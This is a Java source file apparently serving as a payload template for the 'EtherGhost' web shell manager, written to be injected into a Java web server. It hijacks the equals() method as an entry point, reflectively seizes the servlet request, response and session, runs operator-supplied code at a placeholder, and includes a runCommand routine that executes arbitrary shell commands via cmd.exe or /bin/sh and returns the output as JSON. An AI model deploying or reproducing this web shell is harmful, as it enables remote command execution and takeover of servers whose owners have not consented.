import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Payload {
    public boolean equals(Object obj) {
        try {
            serve(obj);
        } catch (Exception e) {

        }
        return true;
    }

    public void serve(Object obj) throws Exception {
        Object request = obj.getClass()
                .getMethod("getRequest", new Class[0])
                .invoke(obj, new Object[0]);
        Object response = obj.getClass()
                .getMethod("getResponse", new Class[0])
                .invoke(obj, new Object[0]);
        Object session = obj.getClass()
                .getMethod("getSession", new Class[0])
                .invoke(obj, new Object[0]);
        String msg = action();
        Object so = response.getClass().getMethod("getOutputStream", new Class[0]).invoke(response, new Object[0]);
        Method write = so.getClass().getMethod("write", byte[].class);
        write.invoke(so, msg.getBytes("UTF-8"));
        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
    }

    private void jsonEncodeObject(StringBuilder sb, Object o) throws IllegalArgumentException {
        if (o instanceof String) {
            jsonEncodeString(sb, (String) o);
        } else if (o instanceof Integer) {
            jsonEncodeInteger(sb, (Integer) o);
        } else if (o instanceof ArrayList) {
            jsonEncodeList(sb, (ArrayList) o);
        } else if (o instanceof HashMap) {
            jsonEncodeMap(sb, (HashMap) o);
        } else if (o.getClass().isArray()) {
            jsonEncodeList(sb, Arrays.asList(((Object[]) o)));
        } else {
            throw new IllegalArgumentException(o.getClass().getName());
        }
    }

    private void jsonEncodeMap(StringBuilder sb, Map<String, Object> m) {
        sb.append("{");
        Boolean hasdata = false;
        for (String key : m.keySet()) {
            if (hasdata) {
                sb.append(",");
            }
            jsonEncodeString(sb, key);
            sb.append(":");
            jsonEncodeObject(sb, m.get(key));
            hasdata = true;
        }
        sb.append("}");
    }

    private void jsonEncodeList(StringBuilder sb, List<Object> l) {
        sb.append("[");
        for (int i = 0; i < l.size(); i++) {
            jsonEncodeObject(sb, l.get(i));
            if (i != l.size() - 1) {
                sb.append(",");
            }
        }
        sb.append("]");
    }

    private void jsonEncodeString(StringBuilder sb, String s) {
        sb.append("\"");
        int p = 0;
        while (p < s.length()) {
            Matcher match = Pattern.compile("^[a-zA-Z0-9-_]+").matcher(s.substring(p));
            if (match.find()) {
                sb.append(s.substring(p, p + match.end()));
                p += match.end();
            } else {
                int codePoint = s.codePointAt(p);
                if (codePoint < 0xffff) {
                    sb.append(String.format("\\u%04x", codePoint));
                    p += 1;
                } else {
                    sb.append(String.format("\\u%04x", 0xD800 + ((codePoint - 0x10000) / 0x400)));
                    sb.append(String.format("\\u%04x", 0xDC00 + ((codePoint - 0x10000) % 0x400)));
                    p += 2;
                }
            }
        }
        sb.append("\"");
    }

    private void jsonEncodeInteger(StringBuilder sb, Integer x) {
        sb.append(String.format("%d", x));
    }

    private LinkedList<String> readStream(InputStream stream, Charset osCharset) throws IOException {
        LinkedList<String> result = new LinkedList<String>();
        BufferedReader br = new BufferedReader(new InputStreamReader(stream, osCharset));
        String line = br.readLine();
        while (line != null && line != "") {
            result.add(line);
            line = br.readLine();
        }
        return result;
    }

    private ArrayList<String> runCommand(String command) throws IOException, IllegalArgumentException {
        Process p;
        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        if (command == null || command.length() == 0) {
            throw new IllegalArgumentException("Wrong command");
        }
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", command });
        } else {
            p = Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", command });
        }
        ArrayList<String> result = new ArrayList<String>();
        result.addAll(readStream(p.getInputStream(), osCharset));
        result.addAll(readStream(p.getErrorStream(), osCharset));
        return result;
    }

    public HashMap<String, Object> ping() {
        HashMap<String, Object> map = new HashMap<>();
        map.put("name", "EtherGhost JSP");
        map.put("version", "idk, maybe v0.0.0.1");
        map.put("messages", new Object[] {
                "Unlike crappy json encoder in Behinder",
                "I got full json support",
                "Aaaaaaand unicode\ud83d\ude07",
                "My list can mix numbers and strings like",
                114514,
                "and this"
        });
        return map;
    }

    public String action() {
        HashMap<String, Object> map = new HashMap<>();
        map.put("code", 0);
        try {
            Object data = ETHER_GHOST_REPLACE_HERE
            map.put("data", data);
        } catch (Exception e) {
            map.put("code", -100);
            map.put("error_type", e.getClass().getName());
            map.put("msg", e.getLocalizedMessage());
        }
        StringBuilder sb = new StringBuilder();
        jsonEncodeObject(sb, map);
        return sb.toString();
    }
}
